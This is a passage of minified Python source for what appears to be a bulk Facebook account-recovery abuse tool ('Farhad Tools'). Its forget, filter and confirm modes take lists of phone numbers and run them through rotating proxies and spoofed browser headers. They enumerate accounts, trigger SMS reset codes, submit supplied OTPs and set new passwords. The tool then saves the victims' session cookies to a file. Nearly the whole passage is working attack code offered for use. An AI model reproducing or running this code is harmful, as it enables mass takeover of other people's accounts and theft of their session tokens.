		for I in A:F=next(M)if M else _B;U=F[_M]if F else _B;V=F[_Q]if F else CURRENT_LOCALE;P.append(T.submit(check_filter,I,U,V,0))
		Q=0
		for W in as_completed(P):
			Q+=1
			try:W.result(timeout=60)
			except Exception as H:safe_print(f"{RED} Thread Error: {H}")
			with print_lock:sys.stdout.write(f"\r{GREEN} Progress: {Q}/{len(A)} numbers processed...");sys.stdout.flush()
	with print_lock:sys.stdout.write(_j);sys.stdout.flush()
	print(LINE);print(f"{GREEN} [{RED}●{GREEN}] {WHITE}Completed Filtering {total_checked} Numbers.");print(f"{GREEN} [{RED}●{GREEN}] {GREEN}Total Found: {total_success} Numbers.");print(f"{GREEN} [{RED}●{GREEN}] {YELLOW}Total Not Found: {total_failed} Numbers.");print(f"{GREEN} [{RED}●{GREEN}] {RED}Total Error: {total_error} Numbers.");print(LINE)
	if found_numbers:
		with open('Number_List.txt','w',encoding=_J)as G:
			for I in found_numbers:G.write(I+_i)
		print(f"{GREEN} [{RED}●{GREEN}] Saved {len(found_numbers)} found accounts to Number_List.txt")
	input(f"\n{WHITE} Press Enter to return to Main Menu...")
def process_sms_forget(session,resp_text,number,url,base_headers,sms_proxy_iterator=_B):
	H=sms_proxy_iterator;G=base_headers;E=url;D=session;B=number;A=resp_text
	if _t in A and _AV in A:
		P=re.findall(_AW,A);F=_B
		for(Q,R)in P:
			I=re.search(_AX+re.escape(R)+_AY,A,re.DOTALL)
			if I:
				J=I.group(1);S=''.join(filter(str.isdigit,J))
				if B.endswith(S):F=Q;safe_print(f"{CYAN} SMS Option Found {EKL} {J}");break
		if F:
			if H:
				try:
					T=next(H);D.proxies.update(T[_M]);safe_print(f"{CYAN} Switching to SMS Proxy & Reloading Page...");K=G.copy();K.update({_F:E});L=D.get(E,headers=K,timeout=30)
					if L.status_code==200:A=L.text;safe_print(f"{GREEN} Page Reloaded Successfully with SMS Proxy")
				except StopIteration:safe_print(f"{YELLOW} No more SMS Proxies available...")
				except Exception as C:safe_print(f"{RED} Proxy Switch Error: {C}")
			try:
				U=re.search(_N,A).group(1)if re.search(_N,A)else'';V=re.search(_O,A).group(1)if re.search(_O,A)else'';M=re.search(_AZ,A,re.DOTALL)
				if M:W=M.group(1).replace(_u,'&');N=f"https://{SELECTED_SERVER}{W}"
				else:N=f"https://{SELECTED_SERVER}/ajax/recover/initiate/"
				O=G.copy();O.update({_V:_W,_f:f"https://{SELECTED_SERVER}",_F:E});X={_R:U,_S:V,_Aa:F,_AK:_AL};Y={'c':_w,'ctx':_Ab,'sr':'0',_v:_x};Z=D.post(N,headers=O,data=X,params=Y,timeout=30)
				if _Ac in Z.text:update_counter(_Y,B,'SMS Sent Successfully',GREEN,tool_name=_H);return _A
				else:update_counter(_C,B,_Ad,RED,tool_name=_H);return _A
			except Exception as C:safe_print(f"{RED} SMS Sending Error: {C}");update_counter(_D,B,f"SMS Error: {C}",RED,tool_name=_H);return _A
		else:update_counter(_C,B,'SMS Option Not Found - Skipping...',YELLOW,tool_name=_H);return _A
	return _h
def check_forget(number,proxy=_B,locale=_P,retry_count=0,sms_proxy_iterator=_B):
	I=locale;H=proxy;G=sms_proxy_iterator;D=retry_count;B=number;C=requests.Session();C.timeout=30
	if H:C.proxies.update(H)
	P=SELECTED_BROWSER if SELECTED_BROWSER!=_l else random.choice([_U,_b,_c,_a,_Z]);F,Q,V,W=get_browser_headers(P,I);C.cookies.update({_m:_L,_n:Q})
	try:
		N=F.copy();N.update({_d:'none'})
		if D==0:safe_print(f"{LIGHT_GRAY} Searching For {B}...")
		J=C.get(f"https://{SELECTED_SERVER}/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0&__mmr=1&_rdr",headers=N,timeout=30)
		try:L=re.search(_N,str(J.text)).group(1)
		except:
			try:L=re.search(_A4,str(J.text)).group(1)
			except:L=''
		try:M=re.search(_O,str(J.text)).group(1)
		except:
			try:M=re.search(_A5,str(J.text)).group(1)
			except:M=''
		R={_R:L,_S:M,_A6:B,_A7:_A8};O=F.copy();O.update({_e:_g,_V:_W,_f:f"https://{SELECTED_SERVER}",_F:f"https://{SELECTED_SERVER}/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0"});S=f"https://{SELECTED_SERVER}/login/identify/?ctx=recover&c=%2Flogin%2F&search_attempts=1&ars=facebook_login&alternate_search=0&show_friend_search_filtered_list=0&birth_month_search=0&city_search=0";A=C.post(S,data=R,headers=O,allow_redirects=_A,timeout=30)
		if _A9 in A.text:update_counter(_C,B,_o,MAGENTA,tool_name=_H);return
		if _AA in A.text:update_counter(_C,B,_AB,GOLD,tool_name=_H);return
		if A.url.startswith(f"https://{SELECTED_SERVER}/login/account_recovery/name_search/"):
			E=F.copy();E.update({_F:f"https://{SELECTED_SERVER}/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0&__mmr=1&_rdr"});A=C.get(A.url,headers=E,timeout=30);safe_print(f"{VIOLET} Clicking Try to another way...")
			if _Ae in A.text:
				E=F.copy();E.update({_F:A.url});A=C.get(f"https://{SELECTED_SERVER}/recover/initiate/?c=%2Flogin%2F&fl=initiate_view&ctx=msite_initiate_view",headers=E,timeout=30)
				if process_sms_forget(C,A.text,B,A.url,F,G):return
			if _AT in A.text and _AU in A.text:update_counter(_C,B,'Only Password Option Found - Skipping...',ORANGE,tool_name=_H);return
			update_counter(_D,B,_s,ORANGE,html_content=A.text,tool_name=_H);return
		elif A.url.startswith(f"https://{SELECTED_SERVER}/login/device-based/ar/login/?ldata="):
			E=F.copy();E.update({_F:f"https://{SELECTED_SERVER}/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0&__mmr=1&_rdr"});A=C.get(A.url,headers=E,timeout=30)
			if _t in A.text:
				try:K=re.search(_Af,A.text).group(1);K=K.replace(_u,'&')
				except:K=_Ag
				T=re.search(_Ah,A.text)
				if T:
					if process_sms_forget(C,A.text,B,A.url,F,G):return
					return
				E=F.copy();E.update({_F:A.url});A=C.get(f"https://{SELECTED_SERVER}{K}",headers=E,timeout=30);safe_print(f"{VIOLET} Clicking Try to another way...")
				if process_sms_forget(C,A.text,B,A.url,F,G):return
				update_counter(_D,B,_Ai,ORANGE,html_content=A.text,tool_name=_H);return
			if _p in A.text:update_counter(_C,B,_q,PURPLE,tool_name=_H);return
			if _AC in A.text or _AD in A.text:update_counter(_C,B,_AE,TOXIC,tool_name=_H);return
			if _AF in A.text:
				if D<3:check_forget(B,H,I,D+1,G)
				return
			update_counter(_D,B,_Aj,ORANGE,html_content=A.text,tool_name=_H);return
		if _AG in A.text:
			if D<3:check_forget(B,H,I,D+1,G);return
			update_counter(_D,B,_AH,RED,html_content=A.text,tool_name=_H);return
		if _r in A.text or _AI in A.text:
			if D<3:check_forget(B,H,I,D+1,G)
			return
		if _X in A.text:update_counter(_D,B,_X,RED,html_content=A.text,tool_name=_H);return
		update_counter(_D,B,_s,ORANGE,html_content=A.text,tool_name=_H)
	except(requests.exceptions.ConnectionError,requests.exceptions.Timeout,requests.exceptions.ChunkedEncodingError)as U:
		if D<3:time.sleep(2);check_forget(B,H,I,D+1,G);return
		update_counter(_D,B,f"Network Error - Skipping...",RED,tool_name=_H)
	except Exception as U:
		if D<3:check_forget(B,H,I,D+1,G);return
		update_counter(_D,B,f"Error - Skipping...",RED,tool_name=_H)
def run_forget():
	global SELECTED_SERVER,SELECTED_DEVICE,SELECTED_BROWSER,CURRENT_LOCALE;clear_logo();print(f"\n {WHITE}FB FORGET TOOL\n{LINE}");C=input(f"\n{GREEN} [{RED}●{GREEN}] Enter file path (TXT or Excel .xlsx) {EKL} ").strip();C=C.strip('"').strip("'")
	if not os.path.exists(C):print(f"{RED} File not found! Use /sdcard/Download/filename.txt for internal storage");input(f"{WHITE} Press Enter to return...");return
	A=[];I=os.path.splitext(C)[1].lower()
	try:
		if I=='.txt':
			with open(C,'r',encoding=_J,errors=_k)as Q:A=[A.strip()for A in Q if A.strip()]
		elif I in['.xlsx','.xls']:
			J=openpyxl.load_workbook(C,data_only=_A);R=J.active
			for S in R.iter_rows(values_only=_A):
				for K in S:
					if K is not _B:
						D=str(K).strip()
						if D and(D.isdigit()or D.startswith('+')and D[1:].isdigit()):A.append(D)
			J.close()
		else:print(f"{RED} Unsupported file format!");input(f"{WHITE} Press Enter to return...");return
	except Exception as H:print(f"{RED} Error reading file: {H}");input(f"{WHITE} Press Enter to return...");return
	if not A:print(f"{RED} No valid numbers found!");input(f"{WHITE} Press Enter to return...");return
	A=list(dict.fromkeys(A));print(f"\n{GREEN} [{RED}●{GREEN}] Loaded {YELLOW}{len(A)}{GREEN} numbers");time.sleep(1);select_server();select_device();select_browser();clear_logo();print(f"\n {GREEN}SELECTED CONFIGURATION:\n{LINE}");print(f" {GREEN}[{RED}●{GREEN}] Server  {EKL} {SELECTED_SERVER}");print(f" {GREEN}[{RED}●{GREEN}] Device  {EKL} {SELECTED_DEVICE}");print(f" {GREEN}[{RED}●{GREEN}] Browser {EKL} {SELECTED_BROWSER}");print(LINE);E=get_proxy_list(_AJ,_Ak,SELECTED_SERVER);L=itertools.cycle(E)if E else _B
	if E:print(f"{GREEN} [{RED}●{GREEN}] Total Main Proxies {EKL} {len(E)}")
	else:M=get_ip_info(_B);CURRENT_LOCALE=get_locale_code(M[_K]);print(f"{GREEN} [{RED}●{GREEN}] Direct Connection {EKL} {M[_G]}")
	print(LINE);F=get_proxy_list('sms_proxy_settings','SMS Proxy',SELECTED_SERVER);T=itertools.cycle(F)if F else _B
	if F:print(f"{GREEN} [{RED}●{GREEN}] Total SMS Proxies {EKL} {len(F)}")
	else:print(f"{YELLOW} No SMS Proxy configured. Will use Main Proxy or Direct Connection")
	try:
		N=input(f"\n{GREEN} [{RED}●{GREEN}] Enter number of Threads (Default: 20) {EKL} ").strip();B=int(N)if N else 20
		if B<1:B=20
		if B>100:B=50
	except:B=20
	clear_logo();reset_counters();print(f"{GREEN} [{RED}●{GREEN}] Total Numbers {EKL} {len(A)}");print(f"{GREEN} [{RED}●{GREEN}] Threads      {EKL} {B}");print(f"{LINE}\n")
	with ThreadPoolExecutor(max_workers=B)as U:
		O=[]
		for V in A:G=next(L)if L else _B;W=G[_M]if G else _B;X=G[_Q]if G else CURRENT_LOCALE;O.append(U.submit(check_forget,V,W,X,0,T))
		P=0
		for Y in as_completed(O):
			P+=1
			try:Y.result(timeout=120)
			except Exception as H:safe_print(f"{RED} Thread Error: {H}")
			with print_lock:sys.stdout.write(f"\r{GREEN} Progress: {P}/{len(A)} numbers processed...");sys.stdout.flush()
	with print_lock:sys.stdout.write(_j);sys.stdout.flush()
	print(LINE);print(f"{GREEN} [{RED}●{GREEN}] {WHITE}Completed Forgetting {total_checked} Numbers.");print(f"{GREEN} [{RED}●{GREEN}] {GREEN}Total Success: {total_success} Numbers.");print(f"{GREEN} [{RED}●{GREEN}] {YELLOW}Total Failed: {total_failed} Numbers.");print(f"{GREEN} [{RED}●{GREEN}] {RED}Total Error: {total_error} Numbers.");print(LINE);input(f"\n{WHITE} Press Enter to return to Main Menu...")
def process_sms_confirm(session,resp_text,number,url,base_headers,otp,password,pwd_proxy_iterator=_B):
	d='c_user';c='name="password_new"';b='default_recover';a='send_sms';Z='name="n"';Q=pwd_proxy_iterator;P=base_headers;F=resp_text;E=session;C=otp;B=number
	if _t in F and _AV in F:
		e=re.findall(_AW,F);I=_B;J=_B
		for(f,g)in e:
			R=re.search(_AX+re.escape(g)+_AY,F,re.DOTALL)
			if R:
				K=R.group(1);h=''.join(filter(str.isdigit,K))
				if B.endswith(h):I=f;J=K;safe_print(f"{CYAN} SMS Option Found {EKL} {K}");break
		if I:
			try:
				G=re.search(_N,F).group(1)if re.search(_N,F)else'';H=re.search(_O,F).group(1)if re.search(_O,F)else'';S=re.search(_AZ,F,re.DOTALL)
				if S:i=S.group(1).replace(_u,'&');L=f"https://{SELECTED_SERVER}{i}"
				else:L=f"https://{SELECTED_SERVER}/ajax/recover/initiate/"
				D=P.copy();D.update({_A1:'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',_e:_g,_V:_W,_f:f"https://{SELECTED_SERVER}",_F:url});j={_R:G,_S:H,_Aa:I,_AK:_AL};k={'c':_w,'ctx':_Ab,'sr':'0',_v:_x};A=E.post(L,headers=D,data=j,params=k);D.update({_A1:_AR,_e:_g,_F:L,_A2:_A3,_AP:'navigate',_d:_AS,_AQ:_L});A=E.get(A.url,headers=D)
				if _Ac in A.text or Z in A.text:
					safe_print(f"{GREEN} [CONFIRM] SMS Sent Successfully {B}");G=re.search(_N,A.text).group(1);H=re.search(_O,A.text).group(1);D.update({_V:_W,_F:A.url,_A2:_A3});l={_R:G,_S:H,'ri':'','rpm':'','sr':'','n':C,_AK:_AL};m={_v:_x,'ph[0]':J if J else f"+{B}"if not B.startswith('+')else B,'rm':a,'spc':'0','fl':b,'try':_L,'c':_w};A=E.post(f"https://{SELECTED_SERVER}/recover/code/",params=m,headers=D,data=l)
					if'/recover/password/'in A.url or c in A.text:
						safe_print(f"{GREEN} [CONFIRM] OTP Matches! Proceeding to Password Reset...");D.update({_F:f"https://{SELECTED_SERVER}/recover/code/"});A=E.get(A.url,headers=D)
						if'name="cur_pass"'in A.text or c in A.text:
							if Q:
								try:
									n=next(Q);E.proxies.update(n[_M]);safe_print(f"{CYAN} Reloading Password Page...");T=P.copy();T.update({_F:f"https://{SELECTED_SERVER}/recover/code/"});U=E.get(A.url,headers=T)
									if U.status_code==200:A=U
								except Exception as o:safe_print(f"{RED} Proxy Switch/Reload Error: {o}")
							M=B;V=re.search('[?&]u=(\\d+)',A.url)
							if V:M=V.group(1)
							G=re.search(_N,A.text).group(1);H=re.search(_O,A.text).group(1);p=int(time.time());N=password;q=f"#PWD_BROWSER:0:{p}:{N}";r={'u':M,'n':C,_v:_x,'fl':b,'c':_w,'shown_session_invalidation_survey':'0','rm':a};s={_R:G,_S:H,'encpass':q};D.update({_F:A.url});t=E.post(f"https://{SELECTED_SERVER}/recover/password/write/",params=r,headers=D,data=s)
							if d in E.cookies:O=E.cookies.get_dict();W=[d,'xs','fr','datr','sb',_n,_m];X=[f"{A}={O[A]}"for A in W if A in O];X+=[f"{A}={B}"for(A,B)in O.items()if A not in W];Y='; '.join(X);safe_print(f"{GREEN} [COOKIES] {Y}");update_counter(_Y,B,f"Password Reset Successfully {N}",GREEN,otp=C,tool_name=_E);save_output('Success.txt',f"{M}|{N}|{Y}");return _A
							else:save_unknown_page(B,'URL_Text_Mismatch',t.text);update_counter(_C,B,'Password Reset Failed - URL/Text Mismatch',RED,otp=C,tool_name=_E);return _A
						else:save_unknown_page(B,'Pwd_Page_Mismatch',A.text);update_counter(_C,B,'Password Page Mismatch (Check Debug)',RED,otp=C,tool_name=_E);return _A
					elif Z in A.text:update_counter(_C,B,'OTP Incorrect - Mismatch',RED,otp=C,tool_name=_E);return _A
					elif'name="action_proceed"'in A.text:update_counter(_C,B,'Captcha Required - Skipping...',RED,otp=C,tool_name=_E);return _A
					else:save_unknown_page(B,'Some_Error',A.text);update_counter(_C,B,'Some Error - Skipping...',RED,otp=C,tool_name=_E);return _A
				if _p in A.text:update_counter(_C,B,_q,PURPLE,otp=C,tool_name=_E);return _A
				if _r in A.text:update_counter(_C,B,'Sorry, something went wrong - Skipping...',YELLOW,otp=C,tool_name=_E);return _A
				save_unknown_page(B,'Code_Sent_Failed',A.text);update_counter(_C,B,_Ad,RED,otp=C,tool_name=_E);return _A
			except:pass
		else:update_counter(_C,B,'SMS Option Not Found/Mismatch - Skipping...',YELLOW,otp=C,tool_name=_E);return _A
	return _h
def check_confirm(number,otp,proxy=_B,locale=_P,retry_count=0,password=_B,pwd_proxy_iterator=_B):
	K=locale;J=proxy;H=pwd_proxy_iterator;G=password;D=retry_count;C=otp;B=number;E=requests.Session();E.timeout=30
	if J:E.proxies.update(J)
	R=SELECTED_BROWSER if SELECTED_BROWSER!=_l else random.choice([_U,_b,_c,_a,_Z]);I,S,X,Y=get_browser_headers(R,K);E.cookies.update({_m:_L,_n:S})
	try:
		P=I.copy();P.update({_d:'none'})
		if D==0:safe_print(f"{LIGHT_GRAY} Searching For {B}...")
		L=E.get(f"https://{SELECTED_SERVER}/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0&__mmr=1&_rdr",headers=P,timeout=30)
		try:N=re.search(_N,str(L.text)).group(1)
		except:
			try:N=re.search(_A4,str(L.text)).group(1)
			except:N=''
		try:O=re.search(_O,str(L.text)).group(1)
		except:
			try:O=re.search(_A5,str(L.text)).group(1)
			except:O=''
		T={_R:N,_S:O,_A6:B,_A7:_A8};Q=I.copy();Q.update({_e:_g,_V:_W,_f:f"https://{SELECTED_SERVER}",_F:f"https://{SELECTED_SERVER}/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0"});U=f"https://{SELECTED_SERVER}/login/identify/?ctx=recover&c=%2Flogin%2F&search_attempts=1&ars=facebook_login&alternate_search=0&show_friend_search_filtered_list=0&birth_month_search=0&city_search=0";A=E.post(U,data=T,headers=Q,allow_redirects=_A,timeout=30)
		if _A9 in A.text:
			if D<3:check_confirm(B,C,J,K,D+1,G,H);return
			update_counter(_C,B,_o,MAGENTA,otp=C,tool_name=_E);return
		if _AA in A.text:update_counter(_C,B,_AB,GOLD,otp=C,tool_name=_E);return
		if A.url.startswith(f"https://{SELECTED_SERVER}/login/account_recovery/name_search/"):
			F=I.copy();F.update({_F:f"https://{SELECTED_SERVER}/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0&__mmr=1&_rdr"});A=E.get(A.url,headers=F,timeout=30);safe_print(f"{VIOLET} Clicking Try to another way...")
			if _Ae in A.text:
				F=I.copy();F.update({_F:A.url});A=E.get(f"https://{SELECTED_SERVER}/recover/initiate/?c=%2Flogin%2F&fl=initiate_view&ctx=msite_initiate_view",headers=F,timeout=30)
				if process_sms_confirm(E,A.text,B,A.url,I,C,G,H):return
			update_counter(_D,B,'Unknown Page (No Selector) - Skipping...',ORANGE,html_content=A.text,otp=C,tool_name=_E);return
		elif A.url.startswith(f"https://{SELECTED_SERVER}/login/device-based/ar/login/?ldata="):
			F=I.copy();F.update({_F:f"https://{SELECTED_SERVER}/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0&__mmr=1&_rdr"});A=E.get(A.url,headers=F,timeout=30)
			if _t in A.text:
				try:M=re.search(_Af,A.text).group(1);M=M.replace(_u,'&')
				except:M=_Ag
				V=re.search(_Ah,A.text)
				if V:
					if process_sms_confirm(E,A.text,B,A.url,I,C,G,H):return
					return
				F=I.copy();F.update({_F:A.url});A=E.get(f"https://{SELECTED_SERVER}{M}",headers=F,timeout=30);safe_print(f"{VIOLET} Clicking Try to another way...")
				if process_sms_confirm(E,A.text,B,A.url,I,C,G,H):return
				update_counter(_D,B,_Ai,ORANGE,html_content=A.text,otp=C,tool_name=_E);return
			if _p in A.text:update_counter(_C,B,_q,PURPLE,otp=C,tool_name=_E);return
			if _AC in A.text or _AD in A.text:update_counter(_C,B,_AE,TOXIC,otp=C,tool_name=_E);return
			if _AF in A.text:
				if D<3:check_confirm(B,C,J,K,D+1,G,H)
				return
			update_counter(_D,B,_Aj,ORANGE,html_content=A.text,otp=C,tool_name=_E);return
		if _AG in A.text:
			if D<3:check_confirm(B,C,J,K,D+1,G,H);return
			update_counter(_D,B,_AH,RED,html_content=A.text,otp=C,tool_name=_E);return
		if _r in A.text or _AI in A.text:
			if D<3:check_confirm(B,C,J,K,D+1,G,H)
			return
		if _X in A.text:update_counter(_D,B,_X,RED,html_content=A.text,otp=C,tool_name=_E);return
		update_counter(_D,B,_s,ORANGE,html_content=A.text,otp=C,tool_name=_E)
	except(requests.exceptions.ConnectionError,requests.exceptions.Timeout,requests.exceptions.ChunkedEncodingError)as W:
		if D<3:time.sleep(2);check_confirm(B,C,J,K,D+1,G,H);return
		update_counter(_D,B,f"Network Error - Skipping...",RED,otp=C,tool_name=_E)
	except Exception as W:
		if D<3:check_confirm(B,C,J,K,D+1,G,H);return
		update_counter(_D,B,f"Error - Skipping...",RED,otp=C,tool_name=_E)
def run_confirm():
	global SELECTED_SERVER,SELECTED_DEVICE,SELECTED_BROWSER,CURRENT_LOCALE;clear_logo();print(f"\n {WHITE}FB CONFIRM TOOL\n{LINE}");print(f" {WHITE}TXT Format: Number|OTP (one per line)");print(LINE);D=input(f"\n{GREEN} [{RED}●{GREEN}] Enter file path (TXT file) {EKL} ").strip();D=D.strip('"').strip("'")
	if not os.path.exists(D):print(f"{RED} File not found! Use /sdcard/Download/filename.txt for internal storage");input(f"{WHITE} Press Enter to return...");return
	A=[]
	try:
		with open(D,'r',encoding=_J,errors=_k)as S:
			for C in S:
				C=C.strip()
				if not C:continue
				if'|'in C:
					I=C.split('|')
					if len(I)>=2:
						J=I[0].strip();E=I[1].strip();L=re.sub('[\\s\\-\\(\\)\\+]','',J)
						if L.isdigit()and E.isdigit():A.append((L,E))
	except Exception as K:print(f"{RED} Error reading file: {K}");input(f"{WHITE} Press Enter to return...");return
	if not A:print(f"{RED} No valid Number|OTP entries found!");input(f"{WHITE} Press Enter to return...");return
	A=list(dict.fromkeys(A));print(f"\n{GREEN} [{RED}●{GREEN}] Loaded {YELLOW}{len(A)}{GREEN} accounts");time.sleep(1);select_server();select_device();select_browser();clear_logo();print(f"\n {GREEN}SELECTED CONFIGURATION:\n{LINE}");print(f" {GREEN}[{RED}●{GREEN}] Server  {EKL} {SELECTED_SERVER}");print(f" {GREEN}[{RED}●{GREEN}] Device  {EKL} {SELECTED_DEVICE}");print(f" {GREEN}[{RED}●{GREEN}] Browser {EKL} {SELECTED_BROWSER}");print(LINE);F=get_proxy_list(_AJ,_Ak,SELECTED_SERVER);M=itertools.cycle(F)if F else _B
	if F:print(f"{GREEN} [{RED}●{GREEN}] Total Main Proxies {EKL} {len(F)}")
	else:N=get_ip_info(_B);CURRENT_LOCALE=get_locale_code(N[_K]);print(f"{GREEN} [{RED}●{GREEN}] Direct Connection {EKL} {N[_G]}")
	print(LINE);G=get_proxy_list('pwd_proxy_settings','Password Proxy',SELECTED_SERVER);T=itertools.cycle(G)if G else _B
	if G:print(f"{GREEN} [{RED}●{GREEN}] Total Password Proxies {EKL} {len(G)}")
	else:print(f"{YELLOW} No Password Proxy configured. Will continue with Main Proxy")
	O=input(f"\n{GREEN} [{RED}●{GREEN}] Enter Password for Accounts {EKL} ").strip()
	if not O:print(f"{RED} Password cannot be empty!");input(f"{WHITE} Press Enter to return...");return
	try:
		P=input(f"{GREEN} [{RED}●{GREEN}] Enter number of Threads (Default: 30) {EKL} ").strip();B=int(P)if P else 30
		if B<1:B=30
		if B>100:B=50
	except:B=30
	clear_logo();reset_counters();print(f"{GREEN} [{RED}●{GREEN}] Total Accounts {EKL} {len(A)}");print(f"{GREEN} [{RED}●{GREEN}] Threads      {EKL} {B}");print(f"{LINE}\n")
	with ThreadPoolExecutor(max_workers=B)as U:
		Q=[]
		for(J,E)in A:H=next(M)if M else _B;V=H[_M]if H else _B;W=H[_Q]if H else CURRENT_LOCALE;Q.append(U.submit(check_confirm,J,E,V,W,0,O,T))
		R=0
		for X in as_completed(Q):
			R+=1
			try:X.result(timeout=120)
			except Exception as K:safe_print(f"{RED} Thread Error: {K}")
			with print_lock:sys.stdout.write(f"\r{GREEN} Progress: {R}/{len(A)} accounts processed...");sys.stdout.flush()
	with print_lock:sys.stdout.write(_j);sys.stdout.flush()
	print(LINE);print(f"{GREEN} [{RED}●{GREEN}] {WHITE}Completed Confirming {total_checked} Accounts.");print(f"{GREEN} [{RED}●{GREEN}] {GREEN}Total Success: {total_success} Accounts.");print(f"{GREEN} [{RED}●{GREEN}] {YELLOW}Total Failed: {total_failed} Accounts.");print(f"{GREEN} [{RED}●{GREEN}] {RED}Total Error: {total_error} Accounts.");print(LINE);input(f"\n{WHITE} Press Enter to return to Main Menu...")
def main_menu():
	clear_logo();display_menu();A=input(f"\n{GREEN} [{RED}●{GREEN}] CHOOSE OPTION {EKL} ").strip()
	if A in('01',_L):run_forget();main_menu()
	elif A in('02','2'):run_filter();main_menu()
	elif A in('03','3'):run_confirm();main_menu()
	elif A in('04','4'):webbrowser.open(_A0);main_menu()
	elif A in('05','5'):print(f"\n{GREEN} Thanks for using Farhad Tools!{RESET}");sys.exit(0)
	else:print(f"\n{RED} Invalid option! Please choose 1-5{RESET}");time.sleep(2);main_menu()
if __name__=='__main__':
	if check_approval():main_menu()